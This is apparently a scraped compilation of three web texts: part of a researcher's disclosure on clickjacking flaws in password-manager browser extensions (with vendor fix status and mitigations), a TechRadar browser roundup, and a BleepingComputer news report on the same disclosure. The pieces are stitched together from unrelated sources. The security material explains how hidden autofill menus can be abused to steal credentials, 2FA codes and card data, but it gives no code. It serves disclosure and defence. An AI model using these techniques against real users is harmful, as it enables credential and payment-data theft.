\u26a0\ufe0f. If other methods exist or there is some bypass, then the extensions are still vulnerable (but I don't know of any at the moment).\nFix Status (Updated: 22.8.2025)\nVULNERABLE\n1Password\nVulnerable version: <=8.11.7.2 (latest)\nVulnerable methods: Parent Element, Overlay\nVideos:\nopacity:0\nopacity:0.5\nIn addition to the clickjacking vulnerability, 1Password has confusing texting in the dialog box when filling in a credit card.

Giving a specific number can be problematic. Not every user necessarily uses browser extensions, but only mobile applications.\nTherefore, I decided to count data from Chrome Web Store, Edge Add-ons, and Firefox Add-ons, which should provide information about active installations.\nThe vulnerabilities affected not only Chromium-based browsers but also extensions for other browsers. Due to the wider adoption of Chromium-based browsers, I demonstrated all the videos using them.\nThe values are always calculated at the time of reporting, or if the vulnerability is not fixed, the data are from the past few weeks.\nThe result is that tens of millions of users could be at risk (~40 million active installations).\nLimitation\nThe most significant limitation is the auto-lock/auto-logout functionality based on inactivity time.\nBy default, it is enabled with a very short time in 1Password (10 min) or Enpass (1 min). Some others also have this restriction, but with an inactivity time longer than 1 day, so the limitation is not as critical for them.\nFor example, iCloud Passwords uses the auto-lock functionality, but it has absolutely no effect on autofill. The clickjacking technique works even if iCloud Passwords is locked or if Lockdown Mode is enabled.\nAnother limitation is the auto-lock/auto-logout functionality based on browser restart. In general, it is necessary to have the password manager unlocked for successful attack.\nAnother limitation, or rather obstacle that the attacker must account for, is the different screen resolutions on the user side. If the attacker uses a background-image with a screenshot of a web page, it must display correctly. Therefore, they must first determine the resolution using javascript and then use the appropriate image resolution.\nOf course, a successful attack requires at least one user click. But with the use of various \"click\" elements, I don't think this is a significant limitation. How many times a day do you click on a cookie or login dialog?\nTo steal credentials, the user also needs to have stored data for the domain. However, if we are talking about an attack on well-known services, users will most likely have those credentials saved.\nMitigation\nBrowser extension developers should focus on the following parts. The missing fix of one method leads to the extension remaining vulnerable.\nExtension Element\n\u2022 styles cannot be changed (MutationObserver)\n\u2022 using \"Closed Shadow-Root\"\nParent Element\n\u2022 BODY/HTML opacity detection\n\u2022 using Popover API for extension should protect this method\nExtension Overlay\n\u2022 last DOM element detection (z-index conflict)\n\u2022 popover elements listing - when the autofill menu is opened, check if any other \"top layer\" elements exist\n\u2192 if another element exists the autofill menu should close\n\u2192 or just don't show extension UI if exist \"popover\" element\n\u2022 elementsFromPoint() can be used for partial overlay but cannot be used for popover elements (pointer-events:none are ignored)\n\u2192 The content script can temporarily remove pointer-events:none from all popover elements before filling in data, then check the \"top layer\" state using elementsFromPoint() and fill the data accordingly.\nDoesn't exist simple protection.\u26a0\ufe0f\nSome platform-level support should be created - new browser API protection for this clickjacking technique.\u26a0\ufe0f\nThe proposed solutions are still handled through javascript and conflicts may occur between exploit code and extension content script (extension white-box analysis can be made). The safest solution is to display a new popup window - but that will be very inconvenient for users.\nRecommendations for Users\nCheck that you have automatic updates enabled and that you are using the latest versions. Especially in companies, versions may be dependent on administrators, who should definitely keep everything updated.\nRegarding the recommendations, it's a somewhat complicated situation. Not every solution will suit every user.\nDisable manual autofill - copy/paste only\n- Many password managers allow disabling this function. But it can be inconvenient for someone. Especially when filling in personal information.\nSet only exact URL match for autofill credentials\n- This can easily mitigate the impacts for subdomains but an attacker can still find a vulnerability on exactly the same domain. Still can be exploitable credit card/personal data.\nSuch a \"hybrid\" solution can be in manually control autofill functionality. Below are instructions for Chromium-based browsers only, I was unable to find this setting for Mozilla Firefox.\nChromium-based browsers:\nExtension settings \u2192 site access \u2192 \"on click\"\nWith this setting, the browser extension will not access the site. The user can temporarily grant access by clicking on the extension icon in the upper right corner.\nConclusion\nClickjacking is not dead - browser extensions are vulnerable to clickjacking\n\u2192 iframe-based and especially to the DOM-based\nMalicious script can be on any trusted website (XSS, subdomain takeover, web cache poisoning...).\nXSS is not RCE, attackers can find (easily) this vulnerability.\n\u26a0\ufe0f 1 click = attacker gets your credentials incl. TOTP (only for vulnerable domain)\nNo vulnerability is needed to leak your credit card, personal data\n\u26a0\ufe0f 1 click = credit cards details or personal data (attacker\u2019s website)\n\u26a0\ufe0f 2 clicks = credit cards details + personal data (attacker\u2019s website)\nFixed: NordPass, ProtonPass, RoboForm, Dashlane, Keeper\nStill vulnerable: Bitwarden, 1Password, iCloud Passwords, Enpass, LastPass, LogMeOnce\nResearch on only 11 password managers\nothers DOM-manipulating extensions will be vulnerable (password managers, crypto wallets, notes etc. )\n2FA should be strictly separated from login credentials - when storing everything in one place, so the attacker could exploit vulnerable password managers and gain access to the account even with 2FA enabled."

      "text": "The Best Web Browsers for 2025: Expert Recommendations for a Superior Internet Experience\nThe best web browsers for speed, privacy, and customization\nNow that we have to interact with the internet on a day-to-day basis, you shouldn't be hamstrung by your choice of web browser. As your portal to the online world, a bad browser can seriously impact your search results, and therefore your experience.\nThe best browsers should therefore offer a lightweight and intuitive interface for conducting searches and navigating the web without impacting your device or site performance. As an added bonus, a good web browser should also allow you to customize the types of data you hand over to the websites you visit.\nOur experts here at TechRadar Pro have tested many of the biggest and best web browsers - from Chrome to Firefox, Safari and Brave - across a range of criteria such as device and operating system compatibility, performance, search quality, user experience, and customization option to help you find the best browser for your needs.\nIf security is top of your list when it comes to browsers, why not take a look at our guide to the best anonymous browsers and secure your online presence even further with one of the best VPNs. You can also secure your entire household's online experience with the best parental control apps.\nWe've also listed the best people search finder sites.\n1. The best VPN service overall: NordVPN:\nNordVPN has been a leader in the VPN market for over 7 years. With user-friendly apps, fast speeds, and a whole wealth of security features, Nord has risen the ranks to lead the way amongst the best VPN services.\nPlus, unlike providers such as ExpressVPN, NordVPN is still available for an impressively low price without compromising features or security. Nord is available from $3.09 per month and has a 30-day money-back guarantee so you can trial with confidence.\n2. The best VPN for beginners: ExpressVPN\nExpressVPN has continually sat amongst my top VPN recommendations. With a simple-to-use interface, superb security, and impressive unblocking capabilities, ExpressVPN has features to suit every need.\nExpressVPN's $6.67 per month price point is both absolutely worth paying if you're looking for the best simple VPN experience, but it does make the service notably more expensive than competitors such as NordVPN. However, it does come with a no-questions-asked 30-day money-back guarantee so you can try before you buy.\n3. The best cheap VPN: Surfshark\nIf you want to secure your web browser on a budget, take a look at TechRadar's #3 VPN\u2014Surfshark. Surfshark offers a fantastic, premium option that's unbelievably simple to use and has become a TechRadar favorite.\nSurfshark offers most of the same features as other top VPN services for less money. From just $2.29 per month, you can access Surfshark plans, or if you want to try Surfshark before committing to a deal, you can use its 30-day money-back guarantee.\nThe Best Web Browsers of 2025 in full:\nWhy you can trust TechRadar\nBest web browser overall\nSpecifications\nReasons to buy\nReasons to avoid\nOlder readers will remember Microsoft as the villains of the Browser Wars that ultimately led to the fall of Netscape and the rise of Firefox, and later on Chrome. But Microsoft is on the side of the angels now and its Edge browser has been rebuilt with Chromium at its heart. It\u2019s Windows\u2019 default browser and there are also versions for iOS, Android, Mac, and even Linux.\nEdge is one of the fastest browsers, thanks to its performance features such as Startup Boost, and Sleep Tabs. The browser is also tuned to be battery efficient. Microsoft also strongly pitches the browser to gamers riding on features such as Clarity Boost that makes visuals appear more clear and crisp. It backs it all up with a whole bunch of privacy-enhancing features, including 5 GB of free VPN that renews every month.\nThis being 2025, Edge also gets Microsoft\u2019s Copilot AI assistant. It can summarize the content of a page, answer questions about the content of a web page, and more. You can also use it to compose social media posts and emails.\nEdge\u2019s biggest advantage is that it\u2019s already baked into your Windows installation. And Microsoft has done enough, in terms of both features and performance, to ensure most of you don\u2019t go out hunting for alternatives.\nRead our full Microsoft Edge review.\nBest web browser for security\nSpecifications\nReasons to buy\nReasons to avoid\nFirefox has long been the Swiss Army Knife of the internet and one of our favorite browsers. It can alert you if your email address is included in a known data breach, it blocks those annoying allow-notifications popups, it blocks \u201cfingerprinting\u201d browser tracking and it brings its picture in picture video mode to the Mac version.\nAs before it\u2019s endlessly customizable both in terms of its appearance and in the range of extensions and plugins you can use. Recent improvements to its backend have dramatically improved its performance, which was starting to lag behind the likes of Chrome, and it\u2019s smooth and solid even on fairly modest hardware. The newer versions of the browser come equipped with a useful language translator to translate web pages, as well as a feature-rich screenshot tool.\nOn the downside though, unlike some of its peers like Opera and Edge, Firefox does not have a built-in VPN. Similarly, its AI assistant, Orbit, is also available as an extension, and isn\u2019t part of the browser.\nAll things considered, Firefox, one of the best browsers for a long time, is certainly a great choice for any internet user. It comes with a diverse range of features, beats Chrome in terms of privacy, is easy to use, and is also mighty quick.\nRead our full Mozilla Firefox review.\nBest web browser for collecting content\nSpecifications\nReasons to buy\nReasons to avoid\nOpera sets out its stall the moment you first run it: its splash screen enables you to turn on its built-in ad blocker, use its built-in VPN, turn on its Crypto Wallet for cryptocurrency, enable in-browser messaging from the sidebar, and move between light or dark modes.\nIt\u2019s a great introduction to a really good browser, although if you\u2019re a gamer you should check out Opera GX instead: that\u2019s designed specifically for gamers and features Twitch integration and Razer Chroma support.\nOpera is yet another Chromium-based browser, so performance is speedy and you can use add-ons from the Chrome library. It also has some interesting ideas of its own such as My Flow: if you\u2019re constantly emailing or messaging interesting links to yourself, Flow enables you to do that more elegantly by making it easy to share content from Opera on your phone to Opera on your computer.\nBut that's just the start. Opera's more advanced features include Aria, a powerful OpenAI-powered assistant which makes it easy to explain or summarize complex content, generate ideas and recommendations, translate text, or create new content of your own: emails, blog posts, letters, even poems or songs.\nAlthough some people still see Opera as an also-ran in the browser world, it's improved in leaps and bounds in recent years, and the latest innovations ensure it's a browser to watch both now and in the future.\nRead our full Opera browser review.\nBest web browser for a mix of everything\nSpecifications\nReasons to buy\nReasons to avoid\nIf imitation is the most sincere form of flattery then Microsoft\u2019s adoption of the Chromium engine for its own Edge browser must be making Google feel pretty good about itself.\nBut there are some areas in which Microsoft\u2019s contender actually beats the big G, most noticeably in resource usage: Chrome is infamous for its hefty resource demands and it can run really slow on lower-end hardware and RAM (albeit more on Windows than ChromeOS, queue conspiracy theories).\nThe Memory Saver mode is designed to address that by freeing up resources from tabs you're not currently using, but despite this Chrome remains pretty hardware-hungry.\nChrome is by no means a bad browser. Quite the contrary: it\u2019s a brilliant browser with a superb library of add-ons, cross-platform support and sync, excellent autofill features, and some great tools for web developers.\nIt can warn you if your email\u2019s been compromised, it has secure DNS lookup for compatible providers (Google\u2019s own Public DNS is one of them) and it blocks lots of dangerous mixed content such as scripts and images on otherwise secure connections.\nPerhaps best of all, if you're tired of suspicious websites asking you to 'click every tile containing a bicycle', Chrome now includes new ways to tell sites you're a human, not a bot, hopefully reducing the number of annoying captchas you'll see.\nHowever, all this kind of gets rolled back by the fact that Chrome is owned and operated by Google as a means of collecting data from its users, regardless of what the company says about privacy. Secure it is, private it isn't.\nRead our full Google Chrome review.\nBest open source web browser\nSpecifications\nReasons to buy\nReasons to avoid\nWhile Firefox once held the top spot in the open source world, many now argue that Brave Browser has taken its place. Brave's strong commitment to privacy, combined with its unique features, makes it a compelling choice for anyone looking for a more secure and user-centric browser.\nBrave is more than just a browser; it's an entire ecosystem of apps and services. There\u2019s the Brave News service, Brave Search, and Brave Rewards, which allows you to earn Basic Attention Token (BAT), Brave's native cryptocurrency, by opting to view privacy-respecting ads. You can then use these tokens to support your favorite content creators.\nFor secure communication, Brave offers Brave Talk, a privacy-focused video conferencing feature that provides free, unlimited one-to-one video calls.\nBeyond its ecosystem, Brave excels at what many users want most from a browser. It'll block ads and trackers, even on YouTube. For an extra layer of anonymity, the browser even integrates Tor. And if you need a quick summary of a webpage or answers to questions about its content, Brave has an AI assistant called Leo that can help.\nBut while Brave does include a VPN, unlike the free VPNs in browsers like Opera and Edge, Brave VPN is a paid subscription service that comes with a 7-day free trial.\nRead our full Brave browser review.\nBest web browser for anonymous browsing\nSpecifications\nReasons to buy\nReasons to avoid\nThe Tor Browser, launched by the Tor Project in 2008, offers a unique way to browse the internet anonymously. Tor stands for The Onion Router, and it's a software designed to hide your location and prevent tracking of your online activity.\nBy default, the Tor Browser encrypts your Browse data three times as it travels across the Tor network, significantly enhancing your privacy. It also isolates each website you visit, which prevents third-party trackers and advertisements from following you across different sites.\nThe browser also makes all its users appear the same, making it much harder for websites to \"fingerprint\" you based on your unique browser configuration. For added privacy, the Tor Browser also automatically deletes all cookies and the history once you close the browser.\nThe main trade-off for this enhanced anonymity is slower website loading times. This is because your data is routed through multiple relay nodes, which adds to the time it takes for information to travel.\nRead our full Tor browser review.\nBest web browser for customization\nSpecifications\nReasons to buy\nReasons to avoid\nVivaldi is the brainchild of former Opera developers, and like Opera, it does things differently from the big-name browsers. In this case, very differently. Vivaldi is all about customization, and you can tweak pretty much everything from the way navigation works to how the user interface looks.\nChromium is once again under the surface here (which means you can use most Chrome add-ons), but what\u2019s on top is very different from other Chromium-based browsers. You can pin sites to the sidebar, stick toolbars wherever it suits you and adjust pages\u2019 fonts and color schemes; have a notes panel as well as the usual history and bookmarks bits; customize the way search works and give search engines nicknames; change how tabs work and get grouped and much, much more.\nYou can even view your history in graph form to see just how much of your time you\u2019ve been spending on particular sites. We particularly like the tab stacks, which are a boon for anyone who tends to end up trying to keep track of dozens of open tabs.\nOn top of that, the browser also offers a free, uncapped free VPN from ProtonVPN, though it\u2019s only available on the desktop at the moment, and will automatically connect you to the fastest available free server from any one of the 5 free countries.\nIf you\u2019re the kind of person who likes to fiddle with interfaces instead of getting on with stuff, it\u2019s a potential productivity nightmare \u2013 but it\u2019s fantastic for power users who know exactly what they want and how they want it to work.\nRead our full Vivaldi browser review.\nBest web browser for privacy\nSpecifications\nReasons to buy\nReasons to avoid\nIf you're looking for a web browser that puts your privacy first, you might want to consider Epic Browser. Built on Chromium, Epic's developers claim they've stripped out all of Google's tracking code, giving you a cleaner, more private Browse experience right out of the box.\nOne of Epic's key features is its aggressive stance against tracking. It disables third-party cookies by default, and its creators assert it's equipped to defend against various fingerprinting techniques designed to identify you online. Furthermore, Epic is always in private browsing mode. This means that as soon as you close the browser, all your data is automatically deleted.\nThe browser also includes a built-in uBlock-based ad-blocker to keep intrusive advertisements at bay. Then there\u2019s its encrypted proxy that encrypts and reroutes your internet traffic, effectively masking your location for enhanced privacy.\nBy default, Epic uses Yahoo as its search engine and encrypts all your search queries to it. However, for those seeking an even higher level of privacy, Epic offers its own EpicSearch engine, which strips out all your personal information before forwarding your search query to a search engine. But while EpicSearch provides a premium privacy experience, it does come with a subscription cost of $2.50/month.\nRead our full Epic browser review.\nWe've featured the best free email clients.\nBest web browser FAQs\nWhat is a web browser?\nA web browser is a tool that enables users to surf and access websites that are on the internet.\nThere are plenty of web browsers, but the most popular options are Mozilla Firefox, Google Chrome, Microsoft Edge, Apple Safari, and Opera.\nHow to choose the best web browsers for you?\nSelecting a web browser to use for the long term is a very personal thing, and will depend on your individual browsing security, privacy and accessibility needs. From a technical perspective, it will also depend on what your computer is able to handle in terms of processing speed, and memory capacity.\nFor example, if privacy is your primary deciding factor in a browser, Firefox or Brave browser will be your best bet. Although if you're used to using Google software and products, opting for Chrome may be a better option.\nWhy are some browsers faster than others?\nThere are a number of factors that contribute to how fast a browser will run, search, and load pages.\nMuch of the internet is built using the Java Script language, and browsers will use different 'engines' to read this code and turn it into the pages you see on the internet. For example, many browsers that are 'Chromium-based' (which we explain below) use the V8 Java Script engine, while Firefox uses the Spidermonkey engine. These engines have different ways of loading Java Script, which can affect browsing speed and page loading.\nSimilarly, not all web pages are created equal. Some web pages could have poorly written code or be filled to the brim with resource-heavy content such as adverts, gifs, videos, and large images. Others may be overwhelmed with traffic which you may have experienced when trying to buy tickets to a very popular event. Other websites might not be loading because they are experiencing a distributed-denial-of-service (DDoS) attack.\nAnother factor is your own internet speed. If you have slow internet, your browser will take longer to fetch all of the parts that make up the web page your are trying to load, meaning that sometimes it isn't entirely the browsers fault. However, other factors such as how much information a browser will cache (temporarily store), or if your computer is running a lot of tabs or programs, can lead to sluggish loading speeds.\nWhat sort of privacy features do different browsers offer?\nWhile some browsers are built for privacy, such as Firefox and Brave, others will have a standard browsing mode and a privacy-focused 'Incognito' mode, such as Chrome and Safari.\nHowever, some browsers take it a step further. Tor for example encrypts your data three times before it is sent out onto the web and prevents trackers and advertisements from following you on your browsing journey. It also deletes cookies and browsing data each time you close the browser.\nThe downside of opting for a more privacy-focused browser is that you may experience significantly slower load speeds, especially if you couple your browser with a virtual private network (VPN).\nThere are ways to enhance your privacy online without having to change your browser, such as installing an ad blocker or tracking blocker extension. It may also be worth taking a look at your browser settings to see what built-in privacy protections it offers.\nWhat is a 'Chromium' browser and why is it different?\nChromium, as its namesake suggests, is a open-source project developed by Google, and forms the basis for many browsers such as Chrome, Microsoft Edge, Opera, Brave, and Vivaldi. As an open-source project, the code is free for anyone to use.\nWhile Chrome is built on the Chromium project, Chrome has closed-source code and incorporates some additional features that allows the browser to automatically update itself, transfer more user data, and allows the browser to run in a security sandbox. Other Chromium browsers will often rely on manual updates.\nThe plus side of Chromium based browsers is that when switching from using one to another Chromium browser, the user experience will remain largely the same, save for branding changes and minor feature tweaks.\nWill adding browser extensions make my experience better or worse?\nAdding extensions to your browser is a fine line between an improved user experience, and a sluggish browsing nightmare.\nSome extensions are built with an improved internet experience in mind. These include ad blockers, password managers with autofill capabilities, and extensions that can monitor spelling and grammar. But bare in mind that in return for their use, some will collect and transfer additional information about your browsing habits.\nOther extensions can negatively impact your browser speed and experience by reducing the performance of the browser when navigating the web and loading pages. This is especially true when running too many extensions. Moreover, running illegitimate or malicious extensions can put your privacy and data at risk.\nThe main thing to consider when installing browser extensions is if they will actually improve your browsing experience, or if it will simply slow you down. Also be wary of extensions that request excessive permissions (such as access to your microphone and webcam).\nWhy are some browsers considered less secure than others?\nYou may have seen browsers such as Google Chrome in the news on multiple occasions settling lawsuits that allege Chrome was collecting more data than it should have been, even when in Incognito mode. Google Chrome and other browsers may be free, but some use the data of their users as a source of income by selling it to advertisers and data brokers.\nSome Chromium based browsers require manual updates in order to run on the latest version, meaning that if a hacker finds an exploit to take over your browser (known as a 'zero-day'), your browser could be vulnerable unless you update it.\nUser habits can also contribute to the security of a browser. If you don't have a high level of cyber hygiene and a constant vigilance against suspicious links and files, your browser or computer can become infected.\nDo browsers work differently on mobile compared to desktop?\nYour user experience for a browser can change massively depending on the platform you are using. Mobile phones and desktops will have different sized screens and levels of performance that can affect your browsing experience.\nThankfully, many web pages are optimized to look and run great whether you are using a desktop, laptop, tablet, or phone - but that wasn't always the case. In the past, some websites took a one-size-fits-all approach that may have meant a website looked great on a desktop, but would look crushed and confusing on a mobile phone. In my own career I have dabbled in web design, and I now have a reverence for designers that can make highly responsive websites no matter the screen size.\nAnother thing to consider is how you interact with your browser on different devices. For example, on a desktop or laptop you have a keyboard and a mouse to navigate the web, whereas on a mobile device or tablet you are often using your finger or a stylus. These can change the user experience significantly.\nFinally, while phones and tablets are steadily catching up to computers in their performance, modern desktops and laptops will often be better equipped to handle having more than a few tabs open, and will perform better when multi-tasking.\nHow we test\nWe've tested the best web browsers on factors like interface, speed, security, and other accessibility features. We evaluated their customizability, cross-platform support, and system requirements.\nWe also mentioned if the browsers had additional security features like VPN or proxy.\nRead how we test, rate, and review products on TechRadar.\nMore reviews\nAlso see our reviews for the following browsers:\n- Brave browser review\n- Safari browser review\n- Tor Browser review\n- Avast browser review\n- Mullvad browser review\n- Maxthon browser review\n- DuckDuckGo Private Browser review\n- Phoenix browser review\n- Aloha browser review\n- Opera Mini review\n- Firefox Focus review\n- Samsung Internet Browser\n- UR Browser review\n- Epic Browser review\nWe've also listed the best parental control software.\nGet in touch\n- Want to find out about commercial or marketing opportunities?

      "text": "Six major password managers with tens of millions of users are currently vulnerable to unpatched clickjacking flaws that could allow attackers to steal account credentials, 2FA codes, and credit card details.\nThreat actors could exploit the security issues when victims visit a malicious page or websites vulnerable to cross-site scripting (XSS) or cache poisoning, where attackers overlay invisible HTML elements over the password manager interface.\nWhile users believe they are interacting with harmless clickable elements, they trigger autofill actions that leak sensitive information.\nThe flaws were presented during the recent DEF CON 33 hacker conference by independent researcher Marek T\u00f3th. Researchers at cybersecurity company Socket later verified the findings and helped inform impacted vendors and coordinate public disclosure.\nThe researcher tested his attack on certain versions of 1Password, Bitwarden, Enpass, iCloud Passwords, LastPass, and LogMeOnce, and found that all their browser-based variants could leak sensitive info under certain scenarios.\nExploitation methods\nThe main attack mechanic is to run a script on a malicious or compromised website that uses opacity settings, overlays, or pointer-event tricks to hide the autofill dropdown menu of a browser-based password manager.\nThe attacker then overlays fake intrusive elements (e.g. cookie banners, popups, or CAPTCHA) so that the user\u2019s clicks fall on the hidden password manager controls, resulting in completing the forms with sensitive information.\nT\u00f3th demonstrated multiple DOM-based subtypes that constitute exploitation variants of the same flaw, including direct DOM element opacity manipulation, root element opacity manipulation, parent element opacity manipulation, and partial or full overlaying.\nThe researcher also demonstrated the possibility of using a method where the UI follows the mouse cursor, so any user click, no matter where it\u2019s positioned, triggers data autofill.\nT\u00f3th says that a universal attack script can be used to identify the password manager active on the target\u2019s browser and then adapt the attack in real-time.\nVendor impact and responses\nThe researcher tested 11 password managers chosen for their popularity and found that all of them were vulnerable to at least one attack method.\nThe researcher notified all vendors notified of the issues in April 2025. The researcher also alerted them that public disclosure would follow in August at DEF CON 33.\nSocket performed another round of contacts this week to notify them that theyr are filing CVEs for their respective products.\n1Password categorized the researcher's report as \u201cout-of-scope/informative,\u201d arguing that clickjacking is a general web risk users should mitigate.\nSimilarly, LastPass marked the report as \u201cinformative,\u201d while Bitwarden acknowledged the issues but downplayed the severity. However, Bitwarden told BleepingComputer that the issues have been fixed in version 2025.8.0, rolling out this week.\nLogMeOnce did not respond to any communication attempts, either by T\u00f3th or Socket.\nCurrently, the following password managers, which together have around 40 million users, are vulnerable to T\u00f3th's attack methods\n- 1Password 8.11.4.27\n- Bitwarden 2025.7.0\n- Enpass 6.11.6 (partial fix implemented in 6.11.4.2)\n- iCloud Passwords 3.1.25\n- LastPass 4.146.3\n- LogMeOnce 7.12.4\nThe vendors that implemented fixes are Dashlane (v6.2531.1 released on August 1), NordPass, ProtonPass, RoboForm, and Keeper (v17.2.0 released in July). However, users should make sure that they're running the latest available versions of the products.\nUntil fixes become available, T\u00f3th recommends that users disable the autofill function in their password managers and only use copy/paste.\nBleepingComputer has contacted all vendors who haven\u2019t pushed fixes onto their products yet, and we will update this post with their responses once they reach us.\n[Update 8/20 3:20 PM EST] - LastPass and LogMeOnce reached out to BleepingComputer following the publication of this article to explain that they too are working on resolving the issues raised in T\u00f3th's report.\n[Update 8/20 3:40 PM EST] - Edited the vendor notification timeline for better accuracy, based on new information received from Socket.\n[Update 8/20 4:15 PM EST] - LastPass sent BleepingComputer the following statement:\n\"We appreciate the work of security researchers, like Marek T\u00f3th, who help raise awareness about potential threats and improve industry-wide security. The clickjacking vulnerability Marek uncovered highlights a broader challenge facing all password managers: striking the right balance between user experience and convenience, while also addressing evolving threat models.\nLastPass has implemented certain clickjacking safeguards, including a pop-up notification that appears before auto-filling credit cards and personal details on all sites, and we\u2019re committed to exploring ways to further protect users while continuing to preserve the experience our customers expect.\nIn the meantime, our threat intelligence, mitigation and escalation (TIME) team encourages all users of password managers to remain vigilant, avoid interacting with suspicious overlays or pop-ups, and keep their LastPass extensions up to date.\" - Alex Cox, Director Threat Intelligence, Mitigation, Escalation (TIME) at LastPass.\n[Update 8/21 3:40 AM EST] - 1Password sent BleepingComputer the following comment:\n\"Clickjacking is not unique to the 1Password browser extension. It is a long-standing web attack technique that affects websites and browser extensions broadly. Because the underlying issue lies in the way browsers render webpages, we believe there\u2019s no comprehensive technical fix that browser extensions can deliver on their own.\nWe take this and all security concerns seriously, and our approach to this particular risk is to focus on giving customers more control. 1Password already requires confirmation before autofilling payment information, and in our next release, we\u2019re extending that protection so users can choose to enable confirmation alerts for other types of data. This helps users stay informed when autofill is happening and in control of their data.\" - Jacob DePriest, CISO at 1Password\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.\nComments\nXSp - 1 day ago\nHeh, I have to thank Google of all things for mitigation on this... as I had to disable autofill so that the thing doesn't get in the way when I'm filtering stuff on Gmail.\nI guess it's safer to use copy paste directly, but then you gotta pay attention to clipboard capturing stuff... at least it also avoid keyloggers.\nI kinda have to agree with this being out of scope or at least kind of an edge case though... as the real issue there is malicious code being infiltrated in a legitimate site in the first place. I mean, if you are not in a legit URL, it shouldn't even trigger autofill with legit data, right?\nEver more complicated scenarios.\nDestakob - 14 hours ago\nI'm still baffled that so many people think cloud based password managers are safe... Keepass is open source, locally stored, high encryption, and easy to use..."
